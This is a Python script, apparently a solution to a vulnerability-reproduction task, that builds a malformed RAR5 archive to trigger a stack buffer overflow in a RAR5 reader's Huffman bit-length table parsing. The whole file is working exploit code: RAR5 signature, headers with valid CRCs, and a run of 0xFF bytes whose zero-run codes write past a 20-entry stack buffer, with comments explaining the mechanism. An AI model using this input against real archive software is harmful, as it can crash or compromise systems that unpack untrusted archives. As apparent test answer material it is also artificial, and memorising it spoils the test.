import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in RAR5 Huffman table parsing.
        """
        # RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1A\x07\x01\x00'
        
        def to_vint(val):
            out = bytearray()
            while val >= 0x80:
                out.append((val & 0x7F) | 0x80)
                val >>= 7
            out.append(val)
            return bytes(out)

        def make_header(h_type, h_flags, specific_data, data_size=None):
            body = bytearray()
            body.extend(to_vint(h_type))
            body.extend(to_vint(h_flags))
            
            if h_flags & 0x02:
                if data_size is None:
                    raise ValueError("Data size required")
                body.extend(to_vint(data_size))
                
            body.extend(specific_data)
            
            raw_body = bytes(body)
            size_bytes = to_vint(len(raw_body))
            
            to_crc = size_bytes + raw_body
            crc = zlib.crc32(to_crc) & 0xFFFFFFFF
            
            return struct.pack('<I', crc) + to_crc

        # 1. Main Archive Header (Type 1)
        main_spec = to_vint(0) # ArcFlags
        main_header = make_header(1, 0, main_spec)
        
        # 2. File Header (Type 2)
        # Flags: 0x0004 (Has CRC), 0x0002 (Has Time) is common but we can skip it for minimal PoC. 
        # Using 0x0004 ensures structure validity.
        file_flags = 0x0004 
        unp_size = 100
        attributes = 0x20
        data_crc = 0xDEADBEEF
        compression = 0x03 # Normal compression (method 3)
        host_os = 0 # Windows
        name = b'poc'
        
        fh_spec = bytearray()
        fh_spec.extend(to_vint(file_flags))
        fh_spec.extend(to_vint(unp_size))
        fh_spec.extend(to_vint(attributes))
        
        if file_flags & 0x04:
            fh_spec.extend(struct.pack('<I', data_crc))
            
        fh_spec.extend(to_vint(compression))
        fh_spec.extend(to_vint(host_os))
        fh_spec.extend(to_vint(len(name)))
        fh_spec.extend(name)
        
        # Payload Construction
        # The vulnerability exists in the RAR5 reader when parsing Huffman tables.
        # Specifically, when decoding the "Bit Length Table" (which has a fixed size of 20 on the stack),
        # an attacker can specify a zero-run (code 15) with a length that writes past the array bounds.
        # 
        # Stream interpretation (LSB first bits):
        # 1 bit: Table Present (1)
        # Loop:
        # 4 bits: Length (15 -> 1111) -> Indicates Zero Run
        # 4 bits: ZeroCount (15 -> 1111) -> 15+2 = 17 zeros
        # 
        # A stream of all 1s (0xFF) effectively sends:
        # 1, 15, 15, 15, 15 ...
        # Iteration 1: writes 17 zeros (Index 0 to 17)
        # Iteration 2: writes 17 zeros (Index 17 to 34) -> Overflow (Buffer size 20)
        
        payload = b'\xFF' * 128
        
        file_header = make_header(2, 0x02, fh_spec, data_size=len(payload))
        
        # 3. End of Archive Header (Type 5)
        end_spec = to_vint(0) # EndArcFlags
        end_header = make_header(5, 0, end_spec)
        
        return sig + main_header + file_header + payload + end_header